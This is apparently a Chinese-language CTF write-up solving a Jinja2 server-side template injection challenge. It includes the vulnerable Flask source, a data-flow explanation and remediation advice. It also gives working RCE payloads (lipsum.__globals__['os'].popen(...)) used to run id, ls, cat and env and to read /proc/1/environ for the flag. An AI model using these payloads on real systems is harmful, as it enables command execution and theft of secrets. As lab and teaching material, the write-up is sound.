---
title: "SSTI 模板注入"
date: 2026-08-10
categories:
  - CTF
  - WEB
tags:
  - CTF
  - SSTI
  - Jinja2
---

# 1. 题目分析

目标：`http://36d94bccbfcddbe42fc22bc6.http-ctf2.dasctf.com/`（dasctf 平台，实例会动态更换，如 `fcfabc72...`）

- 响应头：`Server: openresty`（Nginx 系反代），`Content-Type: text/html; charset=utf-8`
- 页面主体：`<p>password is wrong: </p>`，提示存在 `password` 参数
- 题目名直接点名 SSTI

# 2. 信息收集

```bash
# 初始访问
curl -s -i "http://TARGET/"
# HTTP/1.1 200 OK
# Server: openresty
# <p>password is wrong: </p>

# 探测交互方式
curl -s -i -X POST "http://TARGET/" -d "password=test"
# HTTP/1.1 405 Method Not Allowed, Allow: HEAD, GET, OPTIONS → 仅 GET

# GET 参数回显测试
curl -s -G "http://TARGET/" --data-urlencode "password=test"
# <p>password is wrong: test</p> → 输入被直接回显
```

关键线索：**输入被回显且页面有模板渲染嫌疑** → 尝试模板语法探测。

# 3. 漏洞分析（含推理链和失败路径）

## 推理链

```
页面回显用户输入 "password is wrong: xxx"
  ↓
假设：存在模板注入（SSTI）
  ↓
验证三种模板语法：{{7*7}} / ${7*7} / <%= 7*7 %>
  ↓
结果：{{7*7}} → 49 ✅，其余原样输出
  ↓
结论：Jinja2（Flask）模板注入
  ↓
构造 RCE payload：{{lipsum.__globals__["os"].popen("id").read()}}
  ↓
成功执行命令（uid=0 root）
```

## 尝试过但失败的路径

| 尝试 | 预期 | 实际结果 | 排除的漏洞 |
|------|------|---------|-----------|
| POST `password=test` | 提交密码 | 405 Method Not Allowed | 不是 POST 表单 |
| `${7*7}` | 触发表达式求值 | 原样输出 | 不是 JSP/其他模板 |
| `<%= 7*7 %>` | 触发表达式求值 | 原样输出 | 不是 ERB/ASP |
| 不带 `password=` 前缀发送 payload | 执行 SSTI | 全部返回空（参数名变成了 payload） | 无——**工具使用失误**，payload 必须作为 `password` 参数值 |

> 教训：`curl --data-urlencode '{{7*7}}'` 与 `--data-urlencode 'password={{7*7}}'` 完全不同——前者把 payload 当参数名发送，页面只认 `password` 参数，导致所有探测误判为"被过滤"，浪费数轮请求。**先确认参数名，再发包。**

# 3.1 漏洞原理：完整源码逐行解读

## 3.1.1 源码怎么来的

拿到 RCE 后通过 `cat /app/server.py` 读到的（先 `ls /` 看到根目录有 `app`，再 `ls /app` 确认文件存在，完整推理见 4.4 节）。

> 注意：在网页/终端里看到的源码可能是被挤压成一行、或丢失 `from flask import` 前缀的版本（如 `import render_template_string app = Flask(__name__) ...`），那是**显示/复制问题**，真实文件是下面的标准缩进版本。

## 3.1.2 完整源码（一行未删，来自容器内 `/app/server.py`）

```python
from flask import Flask
from flask import render_template
from flask import request
from flask import render_template_string

app = Flask(__name__)

# FLAG: n1book{eddb84d69a421a82}

@app.route('/')
def index():
    password = request.args.get("password") or ""
    template = '''
        <p>password is wrong: %s</p> 
    ''' %(password)

    return render_template_string(template)

if __name__ == '__main__':
    app.run(debug=False, host="0.0.0.0", port=8000)
```

## 3.1.3 漏洞是怎么形成的（数据流）

```
用户请求: GET /?password={{7*7}}
  ↓ request.args.get("password")
password = "{{7*7}}"
  ↓ %s 字符串格式化拼入模板（危险点①：无过滤、无转义）
template = '''
        <p>password is wrong: {{7*7}}</p> 
    '''
  ↓ render_template_string(template)（危险点②：字符串被当作模板解析）
Jinja2 扫描模板 → 发现 {{7*7}} 是表达式 → 执行求值
  ↓
响应: <p>password is wrong: 49</p>   ← 用户输入变成了代码被执行！
```

**漏洞本质**：用户输入本应是**数据**，却被放到了**代码**的位置。`%s` 拼接把输入塞进了模板字符串，`render_template_string` 又把整个字符串当模板代码解析——两处"正常功能"组合成了漏洞。

## 3.1.4 为什么正确写法不会出问题（对比）

| 写法 | 行为 | 安全性 |
|------|------|--------|
| ❌ `render_template_string("<p>%s</p>" % password)` | 输入拼进字符串 → 字符串整体被当模板 → `{{ }}` 执行 | **漏洞** |
| ✅ `render_template("index.html", password=password)` | 输入作为**数据**传给模板 → 模板文件里的 `{{password}}` 只输出数据，不会执行输入里的语法 | 安全 |

所以修复方向很明确（见第 6 节）：用 `render_template` 渲染文件，用户输入永远作为数据传入，而不是拼进模板字符串。

# 4. 漏洞利用

## 4.1 payload 构造思路（从算术执行升级到命令执行）

核心问题：`{{7*7}}` 只是算算术，怎么让它执行系统命令？

关键在 Python 的一个特性——**任何函数对象都有 `__globals__` 属性**，它指向该函数所在模块的全局命名空间（字典）。只要某个函数所在的模块 `import os` 了，就能通过 `函数.__globals__["os"]` 拿到 os 模块，进而调用 `os.popen()` 执行命令。

Jinja2 模板环境默认暴露的函数对象有：

| 函数 | 来源模块 | globals 里是否有 os |
|------|---------|-------------------|
| `lipsum` | `jinja2/utils.py` | ✅ 模块顶部 `import os` |
| `url_for` | `flask/helpers.py` | ✅ |
| `config` | Flask Config 对象 | 不是函数，走 `config.__init__.__globals__` 链 |

选 `lipsum` 最省事：它是模板内置全局函数，不依赖 Flask 上下文，且 `jinja2/utils.py` 必然 import 了 os。

```
{{7*7}}                       ← 模板能执行表达式（确认 SSTI）
   ↓ 升级思路：找到能触达 os 模块的入口
{{lipsum}}                    ← 函数对象（模板内置，一定有 __globals__）
   ↓
{{lipsum.__globals__}}        ← 函数所在模块的全局命名空间字典
   ↓
{{lipsum.__globals__["os"]}}  ← 字典里取出 os 模块
   ↓
{{lipsum.__globals__["os"].popen("id").read()}}   ← 执行命令
```

## 4.2 分步验证链（每步的预期输出）

| 步骤 | payload | 预期输出 | 证明了什么 |
|------|---------|---------|-----------|
| 1 | `{{7*7}}` | `49` | 确认 SSTI，且是 Jinja2 语法 |
| 2 | `{{lipsum}}` | `<function generate_lorem_ipsum at 0x...>` | `lipsum` 存在且是函数对象 |
| 3 | `{{lipsum.__globals__.keys()}}` | `dict_keys(['...', 'os', ...])` | 全局命名空间里有 `os` |
| 4 | `{{lipsum.__globals__["os"].popen("id").read()}}` | `uid=0(root) gid=0(root)...` | RCE 成功 |
| 5 | `{{lipsum.__globals__["os"].popen("env").read()}}` | 环境变量列表，含 `FLAG=CTF2{...}` | 拿到 flag |

> 为什么字符串用双引号 `"os"`：很多 SSTI 题目会过滤单引号 `'`，双引号是更稳的通用写法（本题验证过单双引号均可）。

## 4.3 浏览器执行方法

**方法 A：地址栏直接构造（最快）**

每次把 `?password=` 后面的值换成 4.2 表的 payload：

```text
http://36d94bccbfcddbe42fc22bc6.http-ctf2.dasctf.com/?password={{7*7}}
```

浏览器会自动把 `{` `}` 编码成 `%7B` `%7D`。页面显示 `password is wrong: 49` 即成功。

> ⚠️ 注意：payload 里如果出现 `+`（如 `{{7+7}}`），必须手动编码成 `%2B`，否则 URL 规范会把 `+` 解码成空格，服务器收到 `{{7 7}}` → Jinja2 语法错误 → 500。`*` 没有特殊含义所以 `{{7*7}}` 直接可用。

**方法 B：HackBar（推荐，参数可复用）**

1. 打开目标页 → F12 → HackBar 标签 → 点 **Load URL** 载入地址
2. URL 栏：`http://36d94bccbfcddbe42fc22bc6.http-ctf2.dasctf.com/?password=`
3. 参数表格里把 password 值改成 payload（如 `{{7*7}}`），选中后点 **URL Encode**（`{` → `%7B`，`}` → `%7D`）
4. 点 **Execute**（`Alt+回车`），响应显示在面板下方
5. 换 payload 时只改参数表格的值 + URL Encode + Execute，不用重敲 URL

**方法 C：F12 Console（验证用）**

```js
fetch("http://36d94bccbfcddbe42fc22bc6.http-ctf2.dasctf.com/?password=" +
  encodeURIComponent('{{lipsum.__globals__["os"].popen("env").read()}}'))
  .then(r => r.text()).then(t => console.log(t))
```

## 4.4 命令执行与 flag 获取（完整流程）

按 4.2 逐步执行后：

```bash
# 确认 RCE
password={{lipsum.__globals__["os"].popen("id").read()}}
# → uid=0(root) gid=0(root) groups=0(root)

# 找 flag：先看根目录有没有 flag 文件
password={{lipsum.__globals__["os"].popen("ls /").read()}}
# → app bin boot dev etc home lib ... （无 flag 文件）

# 读应用源码找线索
password={{lipsum.__globals__["os"].popen("cat /app/server.py").read()}}
# → 完整源码见 3.1.2，注释里有原题 flag: n1book{eddb84d69a421a82}

# 读环境变量（当前平台 flag 在这）
password={{lipsum.__globals__["os"].popen("env").read()}}
# → FLAG=CTF2{9f80767c-40c5-42ac-a29f-0ff382403341}
```

### flag 定位推理链（为什么这么做，为什么要读源码）

拿到 RCE 后直接找 flag 是盲目的——`ls /` 已证明根目录没有 flag 文件。此时应**先做情报收集：读源码**，一份 `server.py` 能一次回答三个问题：

| 问题 | 源码给出的答案 |
|------|--------------|
| 漏洞根因是什么？ | `%s` 拼接 + `render_template_string` 渲染（见 3.1.3 数据流） |
| flag 藏在哪里？ | 注释里有原题 flag `n1book{eddb84d69a421a82}` |
| 应用逻辑如何？ | 单路由 `GET /`，参数只有 `password`，端口 8000 |

### 从源码到 env 的推理（为什么最后一步是 `env`）

读完源码后，下一个动作为什么是 `env`？因为源码分析把其他可能性**逐一排除了**：

| 观察（实测证据） | 结论 |
|------|------|
| 逐行通读源码：整个应用**没有任何处理 flag 的代码**（`grep -rni flag /app` 只命中注释那一行）——不读文件、不查库、不输出 | flag 不在应用逻辑里 |
| `ls /` 无 flag 文件；`find / -maxdepth 3 -iname *flag*` 只有系统文件（`/proc/kpageflags`、`/usr/bin/dpkg-buildflags`） | flag 不在文件系统里 |
| 源码注释 flag 是 `n1book{...}` 格式，平台题目 flag 均为 `CTF2{...}` 格式 | 平台判定的 flag ≠ 源码注释那个，必然另行注入 |
| 排除应用逻辑 + 文件系统后，容器部署最常见的注入点只剩**环境变量**（动态 flag 平台 = K8s env 注入的惯例） | 用 `env` 验证 → `FLAG=CTF2{...}` ✅ |

> 补充：即使没有这段推理，`env` 也是拿到 RCE 后的标准侦察清单项（`id` / `ls` / `env` / `find` / `hostname` 固定跑一遍）。推理链的价值在于让你**确定** env 里有 flag，而不是碰运气——两个位置被排除后，环境变量是唯一的高概率位置。

**为什么 flag 在环境变量里（部署机制分析）**：源码注释的 `n1book{...}` 是 N1BOOK 教材的静态 flag，但平台判定提交的是另一个 `CTF2{...}`，两者关系需要排查部署文件才能说清：

| 证据 | 内容 | 说明 |
|------|------|------|
| `cat /app/docker-compose.yml` | 只有镜像 `n1book/python-ssti` + 端口映射，**无 FLAG** | flag 不是镜像内建的 |
| `cat /app/Dockerfile` | `FROM python:3.7` + `ADD . /app` | 镜像是原题镜像，未改动 |
| `cat /app/entrypoint.sh` | 仅 `python3 /app/server.py` | 启动逻辑里也没有 flag |
| `tr '\0' '\n' < /proc/1/environ` | `FLAG=CTF2{...}` 旁全是 `CTF_TARGET_..._SVC_*` 变量 | **Kubernetes Service 注入的环境变量** |

结论：`FLAG` 由 dasctf 平台部署时通过 K8s Deployment 的 `env` 字段**动态注入**，因此：

- 每次拉起容器生成新 flag（不同实例 flag 不同，笔记里记录的 flag 仅当时有效）
- 平台判定以注入的 `CTF2{...}` 为准；`n1book{...}` 是原题作者留在源码注释里的静态 flag，平台未改动镜像所以仍在
- 验证用 `/proc/1/environ`（PID 1 原始环境，权威证据）；`env` 命令结果相同（shell 继承进程环境）

> 经验：拿到 RCE 后不要盲目 `find / -name "*flag*"`，先读源码搞清 **flag 以什么形态存在**（文件 / 环境变量 / 数据库 / 源码注释），再对症下药。

# 5. Flag

```
CTF2{9f80767c-40c5-42ac-a29f-0ff382403341}
```

获取方式：通过 Jinja2 SSTI 执行 `env` 读取容器环境变量 `FLAG`。

⚠️ **动态 flag**：dasctf 平台每次部署实例都会重新生成 `FLAG` 环境变量（实例 `fcfabc72...` 为 `CTF2{427930d2-d37e-4eef-8a2f-ac5e108adc2c}`），上方的 flag 仅为当时解题记录。**提交时以当前实例 `env` / `/proc/1/environ` 读到的值为准**（排查依据见 4.4 节部署机制分析）。

（源码注释中另有原题 flag `n1book{eddb84d69a421a82}`，为 N1BOOK 原始题目作者留的静态 flag，平台判定以注入的环境变量为准。）

# 6. 知识点总结

- **SSTI（Server-Side Template Injection）**：用户输入未过滤直接拼入模板并由 `render_template_string()` 渲染；本质是**数据被放到了代码的位置**
- **两个 API 的区别**：`render_template_string(字符串)` 把字符串当模板解析（危险）；`render_template(文件, 参数)` 把参数当数据输出（安全）——修复就是用后者
- **Jinja2 探测**：`{{7*7}}` 输出 49 即确认；`${}`（JSP/FreeMarker）、`<%= %>`（ERB）语法无效可快速排除其他模板引擎
- **URL 编码坑**：查询串里 `+` = 空格，payload 含 `+` 必须编码 `%2B`；curl 拼 URL 时 `{}` 是通配符需加 `-g`；`--data-urlencode` 可自动处理
- **Jinja2 RCE 链**：`lipsum.__globals__["os"].popen(cmd).read()` 是最短链；通用链为 `''.__class__.__mro__[1].__subclasses__()` 找 `os._wrap_close` / `subprocess.Popen` 等
- **curl 参数发送**：`--data-urlencode 'name=value'` 必须带参数名；`-G` 将数据附加为 GET 查询串
- **修复建议**：
  - 使用 `render_template`（文件模板）而非 `render_template_string` 渲染用户输入
  - 任何需要拼接用户输入的模板，先对 `{{ }}`、`{% %}`、`{# #}` 转义或做白名单校验
  - 模板引擎开启沙箱（Jinja2 sandboxed environment）

# 7. 解题链路总结图

```
访问首页
  ↓ Server: openresty + "password is wrong: "
确认 GET 参数 password，输入回显
  ↓ POST 405 → 仅 GET
模板语法探测
  ↓ {{7*7}} → 49，${}/<%= %> 无效
确认 Jinja2 SSTI
  ↓
构造 lipsum.__globals__["os"].popen() 链
  ↓ RCE（root）
读 /app/server.py → 完整源码 + 漏洞成因分析（3.1节）+ 原题 flag（静态）
  ↓
排查部署文件均无 FLAG → 推断平台动态注入
  ↓
读 env → 平台 FLAG（动态，每次实例不同）
  ↓
✅ CTF2{9f80767c-40c5-42ac-a29f-0ff382403341}
```


